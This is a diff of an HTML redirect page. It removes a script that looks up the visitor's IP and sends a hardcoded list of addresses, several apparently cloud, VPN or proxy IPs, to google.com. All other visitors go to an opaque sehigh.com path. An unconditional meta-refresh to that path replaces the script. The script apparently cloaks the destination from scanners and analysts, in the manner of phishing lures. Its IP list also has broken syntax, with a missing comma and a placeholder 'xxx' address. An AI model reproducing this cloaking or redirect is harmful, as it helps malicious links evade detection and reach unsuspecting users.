@@ -2,36 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <meta http-equiv="refresh" content="0; URL='https://www.sehigh.com/DZRZX6W/2DZTNR69/'" />
   <title>Redirecting...</title>
-  <script>
-    const blockedIPs = [
-      
-            "185.18.222.147", "103.17.196.155", "198.44.133.53", "138.199.22.183", "106.161.65.206",
-            "54.200.5.221", "35.89.14.236", "104.210.79.75", "35.88.70.185", "96.0.0.81",
-            "20.28.16.4", "104.28.108.0", "16.50.232.14", "173.239.194.27", "217.64.126.104",
-            "104.28.35.3", "104.28.35.4", "68.218.165.136", "173.239.194.229", "68.218.165.140",
-            "52.243.103.225", "48.215.3.146", "149.88.101.20", "217.64.126.150", "104.28.125.4",
-            "154.16.81.84" "34.235.48.77", "54.156.251.192", "149.154.161.xxx",
-    ];
-
-    async function checkIPAndRedirect() {
-      try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        const ip = data.ip;
-
-        if (blockedIPs.includes(ip)) {
-          window.location.href = "https://google.com";
-        } else {
-          window.location.href = "https://www.sehigh.com/DZRZX6W/2DZTNR69/";
-        }
-      } catch (e) {
-        // فاش خدام fetch، يلا طرا مشكل رجع المستخدم لـ google
-        window.location.href = "https://google.com";
-      }
-    }
-
-    window.onload = checkIPAndRedirect;
-  </script>
 </head>
 </html>
